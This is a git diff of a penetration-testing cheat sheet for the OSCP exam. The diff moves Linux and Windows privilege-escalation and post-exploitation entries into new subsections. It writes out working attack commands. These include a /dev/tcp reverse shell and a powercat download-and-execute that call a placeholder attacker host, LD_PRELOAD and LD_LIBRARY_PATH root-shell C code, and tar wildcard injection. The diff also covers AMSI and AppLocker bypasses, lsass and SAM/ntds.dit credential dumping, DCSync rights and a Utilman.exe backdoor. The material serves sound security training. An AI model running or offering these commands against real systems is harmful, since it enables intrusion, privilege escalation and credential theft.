@@ -32,16 +32,12 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 - [Social Media Resources](https://github.com/0xsyr0/OSCP#social-media-resources)
 - [Commands](https://github.com/0xsyr0/OSCP#commands)
 	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
-		- [CentOS](https://github.com/0xsyr0/OSCP#centos)
 		- [curl](https://github.com/0xsyr0/OSCP#curl)
 		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
-		- [dir](https://github.com/0xsyr0/OSCP#dir)
-		- [Environment Variables](https://github.com/0xsyr0/OSCP#environment-variables)
 		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
-		- [gcc](https://github.com/0xsyr0/OSCP#gcc)
-		- [getfacl](https://github.com/0xsyr0/OSCP#getfacl)
-		- [iconv](https://github.com/0xsyr0/OSCP#iconv)
+		- [Linux](https://github.com/0xsyr0/OSCP#linux)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
+		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
 		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
 		- [Ping](https://github.com/0xsyr0/OSCP#ping)
 		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
@@ -53,10 +49,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [Time and Date](https://github.com/0xsyr0/OSCP#time-and-date)
 		- [tmux](https://github.com/0xsyr0/OSCP#tmux)
 		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
-		- [vi](https://github.com/0xsyr0/OSCP#vi)
 		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
 		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
-		- [Windows Command Formatting](https://github.com/0xsyr0/OSCP#windows-command-formatting)
 	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
 		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
 		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
@@ -112,42 +106,21 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
-		- [AMSI](https://github.com/0xsyr0/OSCP#amsi)
-		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
-		- [autologon](https://github.com/0xsyr0/OSCP#autologon)
-		- [Bash Privilege Escalation](https://github.com/0xsyr0/OSCP#bash-privilege-escalation)
-		- [Basic Linux Enumeration](https://github.com/0xsyr0/OSCP#basic-linux-enumeration)
-		- [Basic Windows Enumeration](https://github.com/0xsyr0/OSCP#basic-windows-enumeration)
 		- [Certify](https://github.com/0xsyr0/OSCP#certify-1)
 		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
-		- [Credential Files](https://github.com/0xsyr0/OSCP#credential-files)
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
-		- [find Commands](https://github.com/0xsyr0/OSCP#find-commands)
-		- [grep for Passwords](https://github.com/0xsyr0/OSCP#grep-for-passwords)
 		- [Impacket](https://github.com/0xsyr0/OSCP#impacket-1)
-		- [Internet Information Service (IIS)](https://github.com/0xsyr0/OSCP#internet-information-service-iis)
 		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos-1)
-		- [LD_Preload](https://github.com/0xsyr0/OSCP#ld_preload)
-		- [Linux Wildcards](https://github.com/0xsyr0/OSCP#linux-wildcards)
-		- [logrotten](https://github.com/0xsyr0/OSCP#logrotten)
-		- [Lsass](https://github.com/0xsyr0/OSCP#lsass)
-		- [Path Variable Hijacking](https://github.com/0xsyr0/OSCP#path-variable-hijacking)
+		- [Linux](https://github.com/0xsyr0/OSCP#linux)
+		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
 		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
 		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
-		- [regedit](https://github.com/0xsyr0/OSCP#regedit)
 		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
 		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
-		- [SeBackup and SeRestore Privilege](https://github.com/0xsyr0/OSCP#sebackup-and-serestore-privilege)
-		- [SeBackupPrivilege Privilege Escalation (diskshadow)](https://github.com/0xsyr0/OSCP#sebackupprivilege-privilege-escalation-diskshadow)
-		- [SeTakeOwnership Privilege](https://github.com/0xsyr0/OSCP#setakeownership-privilege)
-		- [SeImpersonate and SeAssignPrimaryToken Privilege](https://github.com/0xsyr0/OSCP#seimpersonate-and-seassignprimarytoken-privilege)
-		- [Unquoted Service Paths](https://github.com/0xsyr0/OSCP#unquoted-service-paths)
-		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
-		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
-		- [writeDACL](https://github.com/0xsyr0/OSCP#writedacl)
+		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
 	- [CVE](https://github.com/0xsyr0/OSCP#cve)
 		- [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/OSCP#cve-2014-6271-shellshock-rce-poc)
 		- [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2019-14287-sudo-bypass)
@@ -188,8 +161,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | Name | URL |
 | --- | --- |
 | Chisel | https://github.com/jpillora/chisel |
-| Swaks | https://github.com/jetmore/swaks |
 | CyberChef | https://gchq.github.io/CyberChef |
+| Swaks | https://github.com/jetmore/swaks |
 
 ### Information Gathering
 
@@ -274,7 +247,6 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
-
 
 ### Post Exploitation
 
@@ -463,12 +435,6 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 ### Basics
 
-#### CentOS
-
-```c
-doas -u <USERNAME> /bin/sh
-```
-
 #### curl
 
 ```c
@@ -499,19 +465,6 @@ curl -s "http://<RHOST>/reports.php?report=2589" | grep Do -A8 | html2text
 ```c
 ./chisel server -p 9002 -reverse -v
 ./chisel client <RHOST>:9002 R:socks
-```
-
-#### dir
-
-```c
-dir flag* /s /p
-dir /s /b *.log
-```
-
-#### Environment Variables
-
-```c
-export PATH=`pwd`:$PATH
 ```
 
 #### File Transfer
@@ -608,7 +561,21 @@ function __curl() {
 __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
-#### gcc
+#### Linux
+
+##### CentOS
+
+```c
+doas -u <USERNAME> /bin/sh
+```
+
+##### Environment Variables
+
+```c
+export PATH=`pwd`:$PATH
+```
+
+##### gcc
 
 ```c
 gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
@@ -616,17 +583,29 @@ i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 
-#### getfacl
+##### getfacl
 
 ```c
 getfacl <LOCAL_DIRECTORY>
 ```
 
-#### iconv
+##### iconv
 
 ```c
 echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
+```
+
+#### vi
+
+```c
+:w !sudo tee %    # save file with elevated privileges without exiting
+```
+
+#### Windows Command Formatting
+
+```c
+echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
 #### Kerberos
@@ -647,6 +626,15 @@ add_principal <EMAIL>            // add a new user to a keytab file
 ksu                              // executes a command with kerberos authentication
 klist -k /etc/krb5.keytab        // lists keytab file
 kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
+```
+
+#### Microsoft Windows
+
+##### dir
+
+```c
+dir flag* /s /p
+dir /s /b *.log
 ```
 
 #### PHP Webserver
@@ -825,12 +813,6 @@ Enter
 export XTERM=xterm
 ```
 
-#### vi
-
-```c
-:w !sudo tee %    # save file with elevated privileges without exiting
-```
-
 #### VirtualBox
 
 ```c
@@ -849,12 +831,6 @@ virtualenv -p python2.7 venv
 python.exe -m pip install virtualenv
 python.exe -m virtualenv venv
 venv\Scripts\activate
-```
-
-#### Windows Command Formatting
-
-```c
-echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
 ### Information Gathering
@@ -2550,96 +2526,6 @@ meterpreter > download *
 
 ### Post Exploitation
 
-#### AMSI
-
-```c
-$str = 'amsiinitfailed'
-$str = 'ams' + 'ii' + 'nitf' + 'ailed'
-```
-
-#### AppLocker Bypass List
-
-```
-Bypass List (Windows 10 Build 1803):
-C:\Windows\Tasks
-C:\Windows\Temp
-C:\windows\tracing
-C:\Windows\Registration\CRMLog
-C:\Windows\System32\FxsTmp
-C:\Windows\System32\com\dmp
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\PRINTERS
-C:\Windows\System32\spool\SERVERS
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
-C:\Windows\SysWOW64\FxsTmp
-C:\Windows\SysWOW64\com\dmp
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
-```
-
-#### autologon
-
-```c
-powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <LHOST> <LPORT>' -Credential $cred"
-```
-
-#### Bash Privilege Escalation
-
-```c
-sudo -u#-1 /bin/bash
-```
-
-##### White Collar eval Arbitrary Code Execution
-
-> https://www.vidarholen.net/contents/blog/?p=716
-
-###### Example
-
-```c
-#!/bin/bash
-chmod +s /bin/bash
-```
-
-```c
-'a[$(/tmp/<FILE>.sh>&2)]+42' /tmp/<FILE>.sh
-```
-
-#### Basic Linux Enumeration
-
-```c
-id
-sudo -l
-uname -a
-cat /etc/hosts
-cat /etc/fstab
-cat /etc/passwd
-ss -tulpn
-ps -auxf
-ls -lahv
-ls -R /home
-```
-
-#### Basic Windows Enumeration
-
-```c
-systeminfo
-whoami /all
-net users
-net users <USERNAME>
-tasklist /SVC
-sc query
-sc qc <SERVICE>
-netsh firewall show state
-schtasks /query /fo LIST /v
-findstr /si password *.xml *.ini *.txt
-dir /s *pass* == *cred* == *vnc* == *.config*
-accesschk.exe -uws "Everyone" "C:\Program Files"
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
-```
-
 #### Certify
 
 > https://github.com/GhostPack/Certify
@@ -2712,79 +2598,11 @@ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <T
 ./BloodHound --disable-gpu-sandbox
 ```
 
-#### Credential Files
-
-> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
-
-> https://www.nirsoft.net/utils/credentials_file_view.html
-
-```c
-cmdkey /list
-rundll32 keymgr.dll, KRShowKeyMgr
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
-reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
-```
-
 #### Evil-WinRM
 
 ```c
 evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
 evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
-```
-
-#### find Commands
-
-##### Specific Size
-
-```c
-find / -size 50M    // find files with a size of 50MB
-```
-
-##### Modified Files
-
-```c
-find / -mtime 10    // find modified files in the last 10 days
-find / -atime 10    // find accessed files in the last 10 days
-find / -cmin -60    // find files changed within the last 60 minutes
-find / -amin -60    // find files accesses within the last 60 minutes
-```
-
-##### Passwords
-
-```c
-find ./ -type f -exec grep --color=always -i -I 'password' {} \;
-```
-
-##### Group Permissions
-
-```c
-find / -group <group> 2>/dev/null
-```
-
-##### User specific Files
-
-```c
-find / -user <USERNAME> 2>/dev/null
-find / -user <USERNAME> -ls 2>/dev/null
-find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
-find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
-```
-
-##### SUID and SGID Files
-
-```c
-find / -perm -4000 2>/dev/null
-find / -perm -4000 2>/dev/null | xargs ls -la
-find / -type f -user root -perm -4000 2>/dev/null
-```
-
-#### grep for Passwords
-
-```c
-grep -R db_passwd
-grep -roiE "password.{20}"
-grep -oiE "password.{20}" /etc/*.conf
-grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
 ```
 
 #### Impacket
@@ -2908,14 +2726,6 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 
 ```c
 $ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
-```
-
-#### Internet Information Service (IIS)
-
-##### Application Pool Credential Dumping
-
-```c
-C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
 ```
 
 #### JAWS
@@ -3251,9 +3061,125 @@ mimikatz # kerberos::ptt <KIRBI_FILE>
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
 ```
 
-#### LD_Preload
+#### Linux
+
+##### Basic Linux Enumeration
+
+```c
+id
+sudo -l
+uname -a
+cat /etc/hosts
+cat /etc/fstab
+cat /etc/passwd
+ss -tulpn
+ps -auxf
+ls -lahv
+ls -R /home
+ls -la /opt
+```
+
+##### find Commands
+
+###### Specific Size
+
+```c
+find / -size 50M    // find files with a size of 50MB
+```
+
+###### Modified Files
+
+```c
+find / -mtime 10    // find modified files in the last 10 days
+find / -atime 10    // find accessed files in the last 10 days
+find / -cmin -60    // find files changed within the last 60 minutes
+find / -amin -60    // find files accesses within the last 60 minutes
+```
+
+###### Passwords
+
+```c
+find ./ -type f -exec grep --color=always -i -I 'password' {} \;
+```
+
+###### Group Permissions
+
+```c
+find / -group <group> 2>/dev/null
+```
+
+###### User specific Files
+
+```c
+find / -user <USERNAME> 2>/dev/null
+find / -user <USERNAME> -ls 2>/dev/null
+find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
+find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
+```
+
+###### SUID and SGID Files
+
+```c
+find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null | xargs ls -la
+find / -type f -user root -perm -4000 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+##### grep for Passwords
+
+```c
+grep -R db_passwd
+grep -roiE "password.{20}"
+grep -oiE "password.{20}" /etc/*.conf
+grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
+```
+
+##### Apache2
+
+###### Read first Line of a File with apache2 Binary
+
+```c
+sudo /usr/sbin/apache2 -f <FILE>
+```
+
+##### Bash Debugging Mode
+
+- Bash <4.4
+
+```c
+env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
+```
+
+##### Bash Functions
+
+- Bash <4.2-048
+
+```c
+function /usr/sbin/<BINARY> { /bin/bash -p; }
+export -f /usr/sbin/<BINARY>
+/usr/sbin/<BINARY>
+```
+
+##### LD_PRELOAD
 
 > https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+###### shell.c
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+or
 
 ```c
 #include <stdio.h>
@@ -3267,24 +3193,54 @@ system("/bin/sh");
 }
 ```
 
-```c
-$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-$ ls -la shell.so
-$ sudo LD_PRELOAD=/tmp/shell.so find
-$ sudo LD_PRELOAD=/tmp/shell.so /opt/<FILE>.sh
-```
-
-#### Linux Wildcards
-
-> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+###### Compiling
 
 ```c
-$ touch -- --checkpoint=1
-$ touch -- '--checkpoint-action=exec=sh shell.sh'
-$ rm ./'--checkpoint-action=exec=python script.sh'
+gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
 ```
 
-#### logrotten
+###### Privilege Escalation
+
+```c
+sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
+```
+
+##### LD_LIBRARY_PATH
+
+###### Get Information about Libraries
+
+```c
+ldd /PATH/TO/BINARY/<BINARY>
+```
+
+###### shell.c
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+###### Compiling
+
+```c
+gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
+```
+
+###### Privilege Escalation
+
+```c
+sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
+```
+
+##### logrotten
 
 > https://github.com/whotwagner/logrotten
 
@@ -3292,28 +3248,19 @@ $ rm ./'--checkpoint-action=exec=python script.sh'
 if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
 ```
 
-##### If "create"-option is set in logrotate.cfg
+###### If "create"-option is set in logrotate.cfg
 
 ```c
 ./logrotten -p ./payloadfile /tmp/log/pwnme.log
 ```
 
-##### If "compress"-option is set in logrotate.cfg
+###### If "compress"-option is set in logrotate.cfg
 
 ```c
 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 ```
 
-#### Lsass
-
-##### Dump
-
-```c
-tasklist
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
-```
-
-#### Path Variable Hijacking
+##### Path Variable Hijacking
 
 ```c
 find / -perm -u=s -type f 2>/dev/null
@@ -3321,16 +3268,397 @@ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 export PATH=$(pwd):$PATH
 ```
 
-#### powercat
+##### Wildcards
+
+> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
+Instead of an option, it creates a file, named `--checkpoint=1`.
 
 ```c
-PS C:\> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
+touch -- --checkpoint=1
+```
+
+or
+
+```c
+touch ./--checkpoint=1
+```
+
+So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.
+
+```c
+touch -- '--checkpoint-action=exec=sh shell.sh'
+```
+
+or 
+
+```c
+touch ./--checkpoint-action=exec=<FILE>
+```
+
+To delete a misconfigured file, put a `./` in front of it.
+
+```c
+rm ./'--checkpoint-action=exec=python script.sh'
+```
+
+##### Writeable Directories in Linux
+
+```c
+/dev/shm
+/tmp
+```
+
+#### Microsoft Windows
+
+##### Basic Windows Enumeration
+
+```c
+systeminfo
+whoami /all
+net users
+net users <USERNAME>
+tasklist /SVC
+sc query
+sc qc <SERVICE>
+netsh firewall show state
+schtasks /query /fo LIST /v
+findstr /si password *.xml *.ini *.txt
+dir /s *pass* == *cred* == *vnc* == *.config*
+accesschk.exe -uws "Everyone" "C:\Program Files\"
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+
+##### AppLocker Bypass List
+
+```
+Bypass List (Windows 10 Build 1803):
+C:\Windows\Tasks
+C:\Windows\Temp
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+##### accesschk
+
+###### Checking File Permissions
+
+```c
+.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
+```
+
+###### Checking Service Permissions
+
+```c
+.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
+```
+
+###### Checking Path Permissions to find Unquoted Service Paths
+
+```c
+.\accesschk.exe /accepteula -uwdq C:\
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
+```
+
+###### Checking Registry Entries
+
+```c
+.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
+```
+
+##### Adding Users to Groups
+
+```c
+net user <USERNAME> <PASSWORD> /add /domain
+net group "Exchange Windows Permissions" /add <USERNAME>
+net localgroup "Remote Management Users" /add <USERNAME>
+```
+
+##### Privileges and Permissions
+
+###### AlwaysInstallElevated
+
+```c
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+```c
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> –f  msi > <FILE>.msi
+```
+
+```c
+msiexec /quiet /qn /i <FILE>.msi
+```
+
+###### SeBackup and SeRestore Privilege
+
+###### Backup SAM and SYSTEM Hashes
+
+```c
+reg save hklm\system C:\Users\<USERNAME>\system.hive
+reg save hklm\sam C:\Users\<USERNAME>\sam.hive
+```
+
+###### Dumping Hashes
+
+```c
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+###### SeBackupPrivilege Privilege Escalation (diskshadow)
+
+> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
+
+###### Script for PowerShell Environment
+
+```c
+SET CONTEXT PERSISTENT NOWRITERSp
+add volume c: alias foobarp
+createp
+expose %foobar% z:p
+```
+
+```c
+diskshadow /s <FILE>.txt
+```
+
+###### Copy ntds.dit
+
+```c
+Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
+```
+
+###### Export System Registry Value
+
+```c
+reg save HKLM\SYSTEM c:\temp\system
+```
+
+Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.
+
+###### SeTakeOwnership Privilege
+
+```c
+takeown /f C:\Windows\System32\Utilman.exe
+```
+
+```c
+icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
+```
+
+```c
+C:\Windows\System32\> copy cmd.exe utilman.exe
+```
+
+Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.
+
+###### SeImpersonate and SeAssignPrimaryToken Privilege
+
+> https://github.com/antonioCoco/RogueWinRM
+
+```c
+.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
+```
+
+##### Registry Handling
+
+###### Enable Colored Output
+
+```c
+reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
+Then open a new Terminal Window.
+
+###### Check for Auto Run Programs
+
+```c
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+
+###### Get Registry Key Information
+
+```c
+req query <REGISTRY_KEY>
+```
+
+###### Modify Registry Key
+
+```c
+reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
+```
+
+##### Searching for Credentials
+
+###### Quick Wins
+
+> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
+
+> https://www.nirsoft.net/utils/credentials_file_view.html
+
+```c
+cmdkey /list
+rundll32 keymgr.dll, KRShowKeyMgr
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+###### Search for Passwords
+
+```c
+dir .s *pass* == *.config
+findstr /si password *.xml *.ini *.txt
+```
+
+###### PowerShell History
+
+```c
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+###### Saved Windows Credentials
+
+```c
+cmdkey /list
+runas /savecred /user:<USERNAME> cmd.exe
+```
+
+###### Search the Registry for Passwords
+
+```c
+req query HKLM /f password /t REG_SZ /s
+req query HKCU /f password /t REG_SZ /s
+```
+
+###### Dumping Credentials
+
+```c
+reg save hklm\system system
+reg save hklm\sam sam
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+```
+
+###### Internet Information Service (IIS)
+
+```c
+C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+###### PuTTY
+
+```c
+reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+###### Lsass
+
+```c
+tasklist
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
+```
+
+###### Unattended Windows Installations
+
+```c
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+
+##### Insecure Service Permissions
+
+```c
+accesschk64.exe -qlc <SERVICE>
+icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
+sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
+sc stop <SERVICE>
+sc start <SERVICE>
+```
+
+##### Service Handling
+
+```c
+sc.exe create <SERVICE_NAME>
+sc start <SERVICE_NAME>
+sc qc <SERVICE_NAME>
+```
+
+##### Scheduled Tasks
+
+```c
+schtasks
+schtasks /query /tn <TASK> /fo list /v
+schtasks /run /tn <TASK>
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+##### Unquoted Service Paths
+
+Search for `Unquoted Service Paths` by using `sc qc`.
+
+```c
+sc qc
+sc qc WindowsScheduler
+sc stop WindowsScheduler
+sc start WindowsScheduler
+```
+
+```c
+icacls <PROGRAM>.exe
+icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
+icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
+```
+
+##### writeDACL
+
+> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+
+```c
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
+Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
+```
+
+##### WMIC
+
+```c
+wmic product get name,version,vendor
+wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
 ```
 
 #### PKINITtools
 
 ```c
 python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx <USERNAME>.ccache
+```
+
+#### powercat
+
+```c
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
 ```
 
 #### PowerShell
@@ -3458,18 +3786,6 @@ pwncat-cs -lp <LPORT>
 (local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
 ```
 
-#### regedit
-
-##### Dumping Credentials
-
-```c
-reg save hklm\system system
-reg save hklm\sam sam
-reg.exe save hklm\sam c:\temp\sam.save
